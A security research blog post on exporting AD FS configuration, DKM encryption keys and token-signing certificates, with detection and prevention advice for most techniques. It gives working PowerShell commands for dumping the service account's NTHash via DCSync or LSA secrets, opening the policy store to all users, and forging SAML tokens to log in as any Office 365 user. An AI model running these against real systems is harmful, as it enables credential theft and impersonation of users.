+++
title = "Exporting AD FS certificates revisited: Tactics, Techniques and Procedures"
date = "2021-04-27"
lastmod = "2022-09-09"
categories =["blog"]
tags = ["Azure Active Directory","Azure","ADFS"]
thumbnail = "/images/posts/ADFS.png"
+++

I've talked about AD FS issues for a couple years now, and finally, after the Solorigate/Sunburst, the world is finally listening 😉

In this blog, I'll explain the currently known TTPs to exploit AD FS certificates, and introduce a totally new technique to export the configuration data remotely.

<!--more-->
# Introduction

I faced the first issues with the Office 365 / Azure AD identity federation in <a href="/post/federation-vulnerability/" target="_blank">2017</a>, 
when I found out that you could login in as any user of the tenant, regardless were they federated or not. The requirement was that the **immutableId** property
of the user was known. The property would be populated automatically for all synced user, for non-synced user this is possible to set manually by admins.

I also knew that it was possible to create SAML tokens to exploit this, as long I would have access token signing certificate. I also knew that the certificate
was stored in the configuration database and encrypted with a key that was stored in AD. Regardless of the hours spent trying to solve the mystery, I just couldn't
decrypt the certificate.

But then came the <a href="https://troopers.de/troopers19/" target="_blank">TROOPERS19</a>, and the wonderful presentation <a href="https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you" target="_blank">I am AD FS and So Can You</a> by 
Douglas Bienstock (<a href="https://twitter.com/doughsec">@doughsec</a>) and Austin Baker (<a href="https://twitter.com/BakedSec">@BakedSec</a>). Their seminal research finally revealed how to decrypt AD FS certificates!
The two famous tools were also introduced: <a href="https://github.com/fireeye/ADFSdump" target="_blank">ADFSDump</a> and <a href="https://github.com/fireeye/ADFSpoof" target="_blank">ADFSpoof</a>.

For short, to export AD FS token signing certificate, two things are needed: AD FS configuration data and certificate encryption key. 

At late 2020, the world finally woke up after an attack against SolarWinds. The attack is better known as Solorigate or Sunburst, and among other things, it exploited the known AD FS issues to get access to SolarWinds' customers
Microsoft clouds. Since then, many providers (including Microsoft) have published a loads of material on how to detect such attacks and how to mitigate allready compromised environments.

In this blog, I'll deep-dive in to TTPs these attacks used, how to detect them, and how to protect from future attacks (where applicable). 

AD FS certification export supports now all methods included in the **AD FS attack graph** I presented at <a href="https://troopers.de" target="_blank">TROOPERS</a> conference in June 2022 (presentation slide deck available <a href="/talks/Eight ways to compromise AD FS certificates.pdf">here</a>).

![AD FS attack graph](/images/posts/ADFS_12.png)

# Exporting configuration

Regardless of the deployment model, AD FS configuration is always stored to a database. For smaller environments, the Windows Internal Database (WID) is used, and Microsoft SQL for larger ones.

The actual configuration is an xml file, including all the settings of the AD FS service. The xml file has over 1000 lines, below is an exerpt with the interesting data.

{{< highlight xml "linenos=inline,hl_lines=9 21 32 42 68 69 70" >}}
<ServiceSettingsData xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
	<SecurityTokenService>
		<AdditionalEncryptionTokens>
			<CertificateReference>
				<IsChainIncluded>false</IsChainIncluded>
				<IsChainIncludedSpecified>false</IsChainIncludedSpecified>
				<FindValue>B7C09D5C2F434A2B746D200946202DE273A4B68C</FindValue>
				<RawCertificate>MII[redacted]+RAh7dEypFVmcIyCd</RawCertificate>
				<EncryptedPfx>AAAAA[redacted]Dbb5/gJLkQ==</EncryptedPfx>
				<StoreNameValue>My</StoreNameValue>
				<StoreLocationValue>CurrentUser</StoreLocationValue>
				<X509FindTypeValue>FindByThumbprint</X509FindTypeValue>
			</CertificateReference>
		</AdditionalEncryptionTokens>
		<AdditionalSigningTokens>
			<CertificateReference>
				<IsChainIncluded>false</IsChainIncluded>
				<IsChainIncludedSpecified>false</IsChainIncludedSpecified>
				<FindValue>6FFF3A436D13EB299549F2BA93D485CBD050EB4F</FindValue>
				<RawCertificate>MII[redacted]OzFUGmGWPXqLk</RawCertificate>
				<EncryptedPfx>AAAAA[redacted]+evM94M17iG9P6VDFrA==</EncryptedPfx>
				<StoreNameValue>My</StoreNameValue>
				<StoreLocationValue>CurrentUser</StoreLocationValue>
				<X509FindTypeValue>FindByThumbprint</X509FindTypeValue>
			</CertificateReference>
		</AdditionalSigningTokens>
		<EncryptionToken>
			<IsChainIncluded>false</IsChainIncluded>
			<IsChainIncludedSpecified>false</IsChainIncludedSpecified>
			<FindValue>B7C09D5C2F434A2B746D200946202DE273A4B68C</FindValue>
			<RawCertificate>MII[redacted]+RAh7dEypFVmcIyCd</RawCertificate>
			<EncryptedPfx>AAAAA[redacted]Dbb5/gJLkQ==</EncryptedPfx>
			<StoreNameValue>My</StoreNameValue>
			<StoreLocationValue>CurrentUser</StoreLocationValue>
			<X509FindTypeValue>FindByThumbprint</X509FindTypeValue>
		</EncryptionToken>
		<SigningToken>
			<IsChainIncluded>false</IsChainIncluded>
			<IsChainIncludedSpecified>false</IsChainIncludedSpecified>
			<FindValue>6FFF3A436D13EB299549F2BA93D485CBD050EB4F</FindValue>
			<RawCertificate>MII[redacted]OzFUGmGWPXqLk</RawCertificate>
			<EncryptedPfx>AAAAA[redacted]+evM94M17iG9P6VDFrA==</EncryptedPfx>
			<StoreNameValue>My</StoreNameValue>
			<StoreLocationValue>CurrentUser</StoreLocationValue>
			<X509FindTypeValue>FindByThumbprint</X509FindTypeValue>
		</SigningToken>
	</SecurityTokenService>
	<PolicyStore>
		<AuthorizationPolicy>@RuleName = "Permit Service Account"
exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2918793985-2280761178-2512057791-1134"])
 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

@RuleName = "Permit Local Administrators"
exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

		</AuthorizationPolicy>
		<AuthorizationPolicyReadOnly>@RuleName = "Permit Service Account"
exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2918793985-2280761178-2512057791-1134"])
 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

@RuleName = "Permit Local Administrators"
exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
 =&gt; issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

		</AuthorizationPolicyReadOnly>
		<DkmSettings>
			<Group>87f0e958-be86-4c39-b469-ac94b5924bd2</Group>
			<ContainerName>CN=ADFS</ContainerName>
			<ParentContainerDn>CN=Microsoft,CN=Program Data,DC=aadinternals,DC=com</ParentContainerDn>
			<PreferredReplica i:nil="true" />
			<Enabled>true</Enabled>
		</DkmSettings>
	</PolicyStore>
</ServiceSettingsData>
{{< /highlight>}}

## Local

### Access config database

This scenario requires a local admin rights to AD FS server, and that WID is used to store configuration data. In this scenario, there is one Primary AD FS node, and one or more Secondary AD FS nodes.
All the management must be done in the primary node, from where all the secondary nodes will fetch the configuration once in five minutes:

![AD FS with WID](/images/posts/ADFS_01.png)

The configuration can be exported from any AD FS server of the farm, regardless are they primary or secondary nodes.

Technically, the export is performed by executing a SQL query against the WID:

![AD FS with WID](/images/posts/ADFS_02.png)

The database connection string can be queried using WMI:
{{< highlight powershell>}}
(Get-WmiObject -Namespace root/AD FS -Class SecurityTokenService).ConfigurationDatabaseConnectionString
{{< /highlight>}}
For Windows Server 2019 AD FS the connection string is:
```
Data Source=np:\\.\pipe\microsoft##wid\tsql\query;Initial Catalog=ADFSConfigurationV4;Integrated Security=True
```

The actual configuration data can now be fetched with the following SQL query:
{{< highlight SQL>}}
SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings
{{< /highlight>}}


To export the configuration with AADInternals:
{{< highlight powershell>}}
# Export configuration and store to variable
$ADFSConfig = Export-AADIntADFSConfiguration -Local
{{< /highlight>}}

Or, to save it to a file:
{{< highlight powershell>}}
# Export configuration to file
Export-AADIntAD SConfiguration | Set-Content ADFSConfig.xml -Encoding UTF8
{{< /highlight>}}

Another technique requiring access to AD FS server would be to download the configuration database from a remote computer same way as Dirk-Jan Mollena (<a href="https://twitter.com/_dirkjan" target="_blank">@_dirkjan</a>) does with his <a href="https://github.com/fox-it/adconnectdump" target="_blank">adconnectdump</a> tool.
However, AFAIK, this has not implemented yet.

### Detecting access to config database
Exploiting this scenario requires logging in to AD FS server. As such, the exploitation can be detected by:

* Monitoring the Security log for the suspicious logons
* Enabling audit logging in WID for ServiceSettings queries and monitoring for suspicious access

To enable AD FS audit logging, connect to WID database by SQL Management Studio or **sqlcmd** using database information from connection string above:
```
sqlcmd -S \\.\pipe\microsoft##wid\tsql\query
```
The following SQL query will enable logging for all SELECT statements against ServiceSettings table.
The server level auditing created in row 3 is attached to **Application Log** and enabled in row 5. In row 7, use the correct database name from the connection string above (depends on the AD FS version).
The database level auditing is defined in row 9 to include all SELECT statements against ServiceSettings table, and enabled in row 11.
{{< highlight sql "hl_lines=7" >}}
USE [master]
GO
CREATE SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] TO APPLICATION_LOG WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
GO
ALTER SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] WITH (STATE = ON)
GO
USE [ADFSConfigurationV4]
GO
CREATE DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_ACCESS_AUDIT] FOR SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] ADD (SELECT ON OBJECT::[IdentityServerPolicy].[ServiceSettings] BY [public])
GO
ALTER DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_ACCESS_AUDIT] WITH (STATE = ON)
GO
{{< /highlight >}}

As a result, all queries for ServiceSettings are now logged to Application log with **event id 33205**. If the **server_principal_name** is not the AD FS service user, the alert should be raised.

![AD FS with WID](/images/posts/ADFS_03.png)

The server level auditing will generate some extra log events, but database level audit should only include the local exports.

### Preventing access to config database
Dumping databases locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface.

### .NET reflection

This technique also requires a local admin rights to AD FS server. Basic idea is to run a legit <a href="https://docs.microsoft.com/en-us/powershell/module/adfs/get-adfsproperties" target="_blank">Get&#8209;AdfsProperties</a> command and 
get the configuration using .NET reflection. This technique was introduced in Microsoft's <a href="https://github.com/microsoft/adfsToolbox" target="_blank">ADFSToolbox</a>. 
ADFSToolbox contains tools "for helping you manage your AD FS farm". 

The source code of <a href="https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208">Test.ServiceAccount.ps1</a> file shows the following:

{{< highlight PowerShell "linenos=inline,linenostart=199">}}
# Gets internal ADFS settings by extracting them Get-AdfsProperties
function Get-AdfsInternalSettings()
{
    $settings = Get-AdfsProperties
    $settingsType = $settings.GetType()
    $propInfo = $settingsType.GetProperty("ServiceSettingsData", [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic)
    $internalSettings = $propInfo.GetValue($settings, $null)
    
    return $internalSettings
}
{{< /highlight >}}

### Detecting and preventing .NET reflection

As this technique is using legit AD FS management cmdlet, it practically can't be detected or prevented, but the limiting access to a minimum would reduce the attack surface.


## Remote as AD FS service account

Dumping the configuration remotely is a totally new functionality in AADInternals and it required a lot of refactoring of Kerberos related functionality :sweat_smile:

The idea for this was given by my colleague **Ryan Cobb** from Secureworks a couple of weeks ago. After tweeting about this new finding, it turned out that, coincidentally, **@doughsec** had also 
researched the same technique a couple of months earlier. The report by **@doughsec** is available <a href="https://www.fireeye.com/blog/threat-research/2021/04/abusing-replication-stealing-adfs-secrets-over-the-network.html" target="_blank">here</a>,
I'll post a detailed blog about my research process later.

The basic idea here is to emulate the AD FS synchronisation by pretending to be the AD FS service:

![AD FS sync](/images/posts/ADFS_04.png)

It turned out that the "AD FS sync" is using SOAP for getting settings. The interesting part is that the whole process takes place using http (not https) and can therefore be monitored by using a proxy like Fiddler or Burp.
However, the content of the SOAP messages are encrypted. I'll not dive into details in this blog, but the process involves Kerberos authentication and exchanging a bunch of encryption keys.

I had earlier implemented functionality to create Kerberos tokens to exploit Seamless SSO. To get it to work with AD FS, I had to do some modifications, but that is also another story 😉

Getting the configuration remotely requires a couple of things:

* Ip address or FQDN of **any AD FS server**
* NTHash of the AD FS service user
* SID of the AD FS service user

With the NTHash and SID, we can craft a Kerberos token and use it to authenticate against AD FS. After the authentication is completed, we can send an (encrypted) SOAP message to:
```
http://<server>/ADFS/services/policystoretransfer
```
The SOAP message would contain the following payload:

{{< highlight xml >}}
<GetState xmlns="http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore">
	<serviceObjectType>ServiceSettings</serviceObjectType>
	<mask xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
	<filter xmlns:i="http://www.w3.org/2001/XMLSchema-instance" i:nil="true"/>
	<clientVersionNumber>1</clientVersionNumber>
</GetState>
{{< /highlight >}}

Getting the AD FS service user's NTHash would usually require tools like <a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank">Mimikatz</a> or <a href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank">DSInternals</a>.

To make it easier for **AADInternals** users, I've included a slighty modified **DSInternals.Replication** functionality which allows getting user information directly from Domain Controllers by emulating DCSync.

First, we need to get the object guid of the AD FS service user. Below I'm using sv_ADFS but that depends on your configuration.
{{< highlight powershell >}}
Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq sv_ADFS | Format-List Name,ObjectGuid,ObjectSid
{{< /highlight >}}
```
Name       : sv_ADFS
ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
ObjectSid  : S-1-5-21-1332519571-494820645-211741994-8710
```

Next, we can query the NTHash of the AD FS service user, which requires credentials having replication permissions.
{{< highlight powershell >}}
# Save credentials to a variable
$cred = Get-Credential

# Get the NTHash as hex string
Get-AADIntADUserNTHash -ObjectGuid "b6366885-73f0-4239-9cd9-4f44a0a7bc79" -Credentials $creds -Server dc.company.com -AsHex
{{< /highlight >}}
```
6e36047d34057fbb8a4e0ce8933c73cf
```

Another option to get NTHash is to get AD FS service account's password from AD FS server (requires local admin rights):
{{< highlight powershell >}}
# Get NTHash of the AD FS service account
Get-AADIntLSASecrets -AccountName sv_ADFS | Select-Object -ExpandProperty MD4Txt
{{< /highlight >}}
```
6e36047d34057fbb8a4e0ce8933c73cf
```

Finally, as we have all we need, we can get the configuration remotely:

{{< highlight powershell >}}
# Export configuration remotely and store to variable
$ADFSConfig = Export-AADIntADFSConfiguration -Hash "6e36047d34057fbb8a4e0ce8933c73cf" -SID "S-1-5-21-1332519571-494820645-211741994-8710" -Server sts.company.com
{{< /highlight >}}

**Note!** Getting configuration remotely **works also when using the full SQL for storing the configuration data**. In this scenario, there
are no primary or secondary servers because all servers are using a centralised database. 
As such, **there is no need for the AD FS sync and it should not be enabled at all**!
However, this how Microsoft designed AD FS, so there is nothing we can do about it 😞

### Detecting
AD FS configuration sync is not logged to anywhere. However, enabling AD FS Tracing, will record **event id 54**, which indicates a succesful authentication:

![AD FS tracing](/images/posts/ADFS_05.png)

If the authentication timestamp is out of normal sync times, or from "wrong" computer, an alert should be raised.

### Preventing
AD FS service requires that https traffic is allowed. Http traffic is only used by load balancers to probe whether the AD FS service is up or not:
```
http://<server>/ADFS/probe
```
As such, allowing http traffic only from other AD FS servers, proxies, and load balancers would reduce the attack surface.

## Remote as any user
Attackers may also <a href="#editing-policy-store-rules" target="_blank">alter the Policy Store Rules</a> to allow anyone to read the configuration.

**AADInternals** supports exporting the configuration remotely as the logged in user since v0.4.9.

{{< highlight powershell >}}
# Export configuration remotely as a logged in user and store to variable
$ADFSConfig = Export-AADIntADFSConfiguration -Server sts.company.com -AsLoggedInUser
{{< /highlight>}}

### Detecting
For the AD FS servers, same detection techniques apply as above. However, now the user dumping configuration will first need to get Kerberos token from the DC. 
As such, we can monitor for any suspicious login activities.

### Preventing
Blocking all http traffic (port 80) to AD FS servers would prevent exporting the configuration.


# Editing Policy Store Rules

Besides exporting the configuration, adversaries can also edit the configuration. This scenario requires a local admin rights to AD FS server, and that WID is used to store configuration data.  

The access to configuration data is limited by **Policy Store Rules**. The default rules are similar to following:

```
AuthorizationPolicyReadOnly : @RuleName = "Permit Service Account"
							  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
							   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

							  @RuleName = "Permit Local Administrators"
							  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
							   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

AuthorizationPolicy         : @RuleName = "Permit Service Account"
							  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid", Value == "S-1-5-21-2108354183-1066939247-874701363-3086"])
							   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

							  @RuleName = "Permit Local Administrators"
							  exists([Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid", Value == "S-1-5-32-544"])
							   => issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");

```

As we can see, there are two rules: one for Read-Write permissions and one for Read-Only permission. The rules are defined using <a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/ad-fs-2-0-claims-rule-language-primer/ba-p/399789" target="_blank">AD FS Claims Rule Language</a>.
As such, we can define as complex rules for giving permissions as we want to. The default rules are assigning RW permissions to the Local Administrators (group) and to AD FS service user (user or gMSA).

During the initial attack/compromise, adversaries often would like to have more persistent access to the configuration data. The easiest way to achieve this is to allow read permissions to all users. **AADInternals** supports editing the Policy Store Rules since v0.4.8.

Technically, the export is edited by executing a SQL query against the WID:

![AD FS with WID](/images/posts/ADFS_02.png)

The following script will change the Read-Only permission so that anyone can get the configuration - RW permissions remain intact. 
{{< highlight powershell >}}
# Get Policy Store Authorisation Policy rules from the local AD FS
$authPolicy = Get-AADIntADFSPolicyStoreRules

# Get the configuration from the local AD FS server and set read-only policy to allow all to read
$config = Set-AADIntADFSPolicyStoreRules -AuthorizationPolicy $authPolicy.AuthorizationPolicy

# Set the configuration to the local AD FS database
Set-AADIntADFSConfiguration -Configuration $config
{{< /highlight>}}

The resulting rule for AuthorizationPolicyReadOnly:
```
=> issue(Type = "http://schemas.microsoft.com/authorization/claims/permit", Value = "true");
```

As a result, exporting AD FS configuration remotely doesn't require Local Admin permissions on the AD FS server or AD FS service account credentials/hash. Any use who can log in to the domain (or AD FS server) can now export the configuration remotely.

## Detecting

Detection happens in a similar manner than in exporting the local configuration. The following SQL query will enable logging for all UPDATE statements against ServiceSettings table.

{{< highlight sql >}}
USE [master]
GO
CREATE SERVER AUDIT [ADFS_AUDIT_APPLICATION_UPDATE_LOG] TO APPLICATION_LOG WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
GO
ALTER SERVER AUDIT [ADFS_AUDIT_APPLICATION_UPDATE_LOG] WITH (STATE = ON)
GO
USE [ADFSConfigurationV4]
GO
CREATE DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_UPDATE_AUDIT] FOR SERVER AUDIT [ADFS_AUDIT_APPLICATION_UPDATE_LOG] ADD (UPDATE ON OBJECT::[IdentityServerPolicy].[ServiceSettings] BY [public])
GO
ALTER DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_UPDATE_AUDIT] WITH (STATE = ON)
GO
{{< /highlight >}}

Now all edit events are logged to the Application log:

![AD FS with WID](/images/posts/ADFS_11.png)


## Preventing

Editing database locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface.


# Exporting configuration encryption key

AD FS is using Distributed Key Manager (DKM) container to store the configuration encryption key in Active Directory. Container location is included in the configuration xml (lines 69 and 70). 

Inside the container there are one or more "Groups". The correct group is also included in the configuration xml (line 68). Inside the group, there are two (or more) contact objects.
One of those objects is always named to "CryptoPolicy" and its **DisplayName** attribute is a GUID. The encryption key is located in the object, which has an "**l**" (location) attribute value matching
the **DisplayName of the CryptoPolicy object**.

![AD FS encryption key](/images/posts/ADFS_06.png)

## Local (.NET reflection)

The local export here refers to export taking place on AD FS server. This technique is also using .NET reflection as introduced in <a href="https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor" target="_blank">FoggyWeb</a>:

![FoggyWeb](/images/posts/ADFS_15.png)

The basic idea here is to use AD FS binaries to get the key for you, making it extremely stealthy.

However, the code must be run as AD FS service account. Long story short, I solved this challenge by running a custom made service as AD FS service account.


![export using service](/images/posts/ADFS_14.png)

After the service is started, it will listen a named pipe to get configuration sent by AADInternals. After receiving the configuration, the service 
will use .NET reflection to get the DKM key from AD and returns it to AADInternals via named pipe. Source code of the service available in <a href="https://github.com/Gerenios/public/blob/master/KDFDumpService.cs" target="_blank">github</a>.

To export the key with AADInternals:
{{< highlight powershell >}}
# Export encryption key and store to variable
$ADFSKey = Export-AADIntEncryptionKey -Local -Configuration $ADFSConfig
{{< /highlight >}}

### Detecting
Detecting the encryption key export is based on enabling auditing the access to AD FS DKM container. 
For instance, Roberto Rodriguez (<a href="https://twitter.com/Cyb3rWard0g/" target="_blank">@Cyb3rWard0g</a>) has published a great <a href="https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html" target="_blank">article</a>
on how to enable auditing.

However, as this technique is using AD FS binaries as AD FS service account to access DKM container, it is in practice undetectable.

On AD FS server, the service used to get the key is present for a very brief time:
![aadinternals service](/images/posts/ADFS_16.png)

Monitoring creation of new services, especially those running as AD FS service account, helps to detect execution of this technique.

### Preventing
Exporting the encryption key locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface.

## Remote
Exporting the encryption key remotely is using DCSync. As such, the credentials with directory replication rights are needed, but the actual export can be performed from any computer. 
Also the object guid of the DKM object is needed.

![remote encryption key export](/images/posts/ADFS_09.png)

{{< highlight powershell >}}
# Save credentials to a variable
$cred = Get-Credential

# Export encryption key remotely and store to variable
$ADFSKey = Export-AADIntADFSEncryptionKey -Server dc.company.com -Credentials $cred -ObjectGuid "930e004a-4486-4f58-aead-268e41c0531e"
{{< /highlight >}}

### Detecting
Technically, the encryption key is fetched using DCSync. As such, it will generate **event id 4662** to Security log. However, the access to DKM container is NOT detected.

![detecting remote key export](/images/posts/ADFS_10.png)

### Preventing
In practice, exporting the encryption key remotely can not prevented, but limiting the replication rights would reduce the attack surface.

# Exporting AD FS certificates

After exporting the configuration and encryption key, we are ready to decrypt the AD FS certificates. As we can see from the configuration xml, it includes certificates for Signing Token (line 42) and Encryption Token (line 32).
Also "additional" certificates for signing token (line 21) and encryption token (line 9) are included. These additional certificates are (usually) generated automatically, when the currently used
certificates getting near their expiration date. If the additional certificates are same than "current" certificates, they are not exported.

To export AD FS certificates to the current directory:
{{< highlight powershell >}}
# Export AD FS certificates
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $ADFSKey
{{< /highlight >}}

If you are running this on AD FS server, you can omit the parameters:
{{< highlight powershell >}}
# Export AD FS certificates on AD FS server
Export-AADIntADFSCertificates
{{< /highlight >}}

# Exploiting

To exploit the Azure AD with the exported AD FS signing certificates, we need to know:

* The issuer URI of the AD FS service
* ImmutableId of the user we want to login as

First, lets get the issuer URI. It can be fetched from the Azure AD or from the AD FS server.

To get the issuer URI from Azure AD using MsOnline PS module:
{{< highlight powershell >}}
# Get the issuer URI
$Issuer = (Get-MsolDomainFederationSettings -DomainName <domain>).IssuerUri
{{< /highlight >}}

To get the issuer URI from the AD FS server:
{{< highlight powershell >}}
# Get the issuer URI
$Issuer = (Get-ADFSProperties).Identifier.OriginalString
{{< /highlight >}}

**Note:** If AD FS is configured using Azure AD Connect, the OriginalString may NOT equal to issuer uri registered to Azure AD!

Next, we need the ImmutableId of the user we want to logon as. The ImmutableId can also be fetched from the Azure AD or from on-prem AD (ImmutableId is Base64 encoded ObjectGuid of the user's on-prem AD account).

To get users and immutable id's from Azure AD using MsOnline PS module:
{{< highlight powershell >}}
# Get ImmutableIds
Get-MsolUser | select UserPrincipalName,ImmutableId
{{< /highlight >}}

To get users and immutable id's from on-prem AD using AzureAD PS module:
{{< highlight powershell >}}
# Get ImmutableIds
Get-ADUser -Filter * | select UserPrincipalname,@{Name = "ImmutableId" ; Expression = { "$([Convert]::ToBase64String(([guid]$_.ObjectGuid).ToByteArray())) "}}
{{< /highlight >}}

```
UserPrincipalname    ImmutableId              
-----------------    -----------              
AlexW@company.com    Ryo4MuvXW0muelHOefJ9yg== 
AllanD@company.com   Eo+jOAQegUi6rEy8+Yu1Rg== 
DiegoS@company.com   cl/bTG5zJku9VynOaXYaeQ== 
IsaiahL@company.com  iZaESRicxECDk5bN7gZhPg== 
JoniS@company.com    iGyyi+gq40u409PXjE3yRg== 
LynneR@company.com   QpHd34ay4UKo0whX6hui3g== 
MeganB@company.com   31YCEbfrMUCefem7zlPYTg== 
NestorW@company.com  jyEyYWLzKkSpq3bERRG+PQ== 
PattiF@company.com   xTuqzBwFbUePyPGRRA1R4g== 
SamiL@company.com    VlUqJm8rrUeAhrhJGIhYsQ== 
MarkR@company.com    J1OAD14fgEWTMjLqQL5+/g== 
```

Now we can login as any user whose ImmutableId is known. The following command will open a Chrome browser and log the user automatically in.
{{< highlight powershell >}}
# Open Office 365 portal as the given user
Open-AADIntOffice365Portal -ImmutableID iZaESRicxECDk5bN7gZhPg== -PfxFileName .\ADFS_signing.pfx -Issuer $Issuer -Browser Chrome
{{< /highlight >}}

We can also use the same information to get access token to any Office 365/Azure AD service we like:
{{< highlight powershell >}}
# Create a SAML token
$saml = New-AADIntSAMLToken -ImmutableID iZaESRicxECDk5bN7gZhPg== -PfxFileName .\ADFS_signing.pfx -Issuer $Issuer

# Get access token for Outlook
Get-AADIntAccessTokenForEXO -SAMLToken $saml -SaveToCache
{{< /highlight >}}
```
Tenant                               User                Resource                      Client                              
------                               ----                --------                      ------                              
112d9bdc-b677-4a5f-8650-2948dbedb02f IsaiahL@company.com https://outlook.office365.com d3590ed6-52b3-4102-aeff-aad2292ab01c
```


# Summary

In this blog post, I introduced various techniques how to export AD FS configuration data and encryption key to extract the AD FS certificates. Corresponding detection and prevention
techniques were also introduced.

# References
* Douglas Bienstock and Austin Baker: <a href="https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you" target="_blank">I am AD FS and So Can You</a>
* Fireeye: <a href="https://github.com/fireeye/ADFSdump" target="_blank">ADFSDump</a>
* Fireeye: <a href="https://github.com/fireeye/ADFSpoof" target="_blank">ADFSpoof</a>
* Microsoft: <a href="https://github.com/microsoft/adfsToolbox" target="_blank">ADFSToolbox</a>, <a href="https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208">Test.ServiceAccount.ps1</a>
* Douglas Bienstock / Fireeye: <a href="https://www.fireeye.com/blog/threat-research/2021/04/abusing-replication-stealing-adfs-secrets-over-the-network.html" target="_blank">Abusing Replication: Stealing AD FS Secrets Over the Network</a>
* Dirk-Jan Mollena: <a href="https://github.com/fox-it/adconnectdump" target="_blank">adconnectdump</a>
* Benjamin Delby: <a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank">Mimikatz</a>
* Michael Grafnetter: <a href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank">DSInternals</a>
* Microsoft: <a href="https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor" target="_blank">FoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor</a>
* Roberto Rodriquez: <a href="https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html" target="_blank">Threat Hunter Playbook: Active Directory Federation Services (ADFS) Distributed Key Manager (DKM) Keys</a>
* Ned Pyle (Microsoft): <a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/ad-fs-2-0-claims-rule-language-primer/ba-p/399789" target="_blank">AD FS 2.0 Claims Rule Language Primer</a>